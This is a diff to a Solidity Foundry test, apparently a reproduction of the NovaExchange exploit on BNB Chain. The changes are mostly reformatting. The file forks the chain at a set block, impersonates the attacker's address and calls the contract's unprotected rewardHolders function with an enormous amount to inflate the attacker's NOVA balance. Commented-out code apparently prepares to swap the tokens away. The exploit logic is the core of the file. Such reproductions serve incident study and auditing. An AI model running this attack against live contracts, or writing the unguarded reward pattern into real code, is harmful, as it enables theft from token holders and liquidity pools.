@@ -3,7 +3,7 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
-import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";
+import {IERC20} from "src/interfaces/IERC20.sol";
 
 import {IPancakeRouter} from "src/interfaces/IPancakeRouter.sol";
 // @Analysis
@@ -13,22 +13,21 @@ import {IPancakeRouter} from "src/interfaces/IPancakeRouter.sol";
 // forge test --contracts ./src/test/NovaExchange_exp.sol -vv
 
 interface INovaExchange {
-
     function rewardHolders(uint256 amount) external;
 
     function balanceOf(address account) external view returns (uint256);
 
     function approve(address spender, uint256 value) external returns (bool);
-
 }
 
 contract ContractTest is Test {
-
-    INovaExchange novaContract = INovaExchange(0xB5B27564D05Db32CF4F25813D35b6E6de9210941);
+    INovaExchange novaContract =
+        INovaExchange(0xB5B27564D05Db32CF4F25813D35b6E6de9210941);
     address attacker = 0xCBF184b8156e1271449CFb42A7D0556A8DCFEf72;
     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
 
-    IPancakeRouter wbnb_nova = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E)); // wbnb/nova Pair
+    IPancakeRouter wbnb_nova =
+        IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E)); // wbnb/nova Pair
 
     function setUp() public {
         vm.createSelectFork("bsc", 23_749_678); //fork bsc at block number 23749678
@@ -38,13 +37,19 @@ contract ContractTest is Test {
     }
 
     function testExploit() public {
-        emit log_named_uint("Before exploit, NOVA balance of attacker:", novaContract.balanceOf(attacker));
+        emit log_named_uint(
+            "Before exploit, NOVA balance of attacker:",
+            novaContract.balanceOf(attacker)
+        );
 
         vm.prank(attacker);
 
         novaContract.rewardHolders(10_000_000_000_000_000_000_000_000_000);
 
-        emit log_named_uint("After exploit,  NOVA balance of attacker:", novaContract.balanceOf(attacker));
+        emit log_named_uint(
+            "After exploit,  NOVA balance of attacker:",
+            novaContract.balanceOf(attacker)
+        );
 
         // address[] memory path2 = new address[](2);
         // path2[0] = address(novaContract);
@@ -63,5 +68,4 @@ contract ContractTest is Test {
     }
 
     receive() external payable {}
-
 }
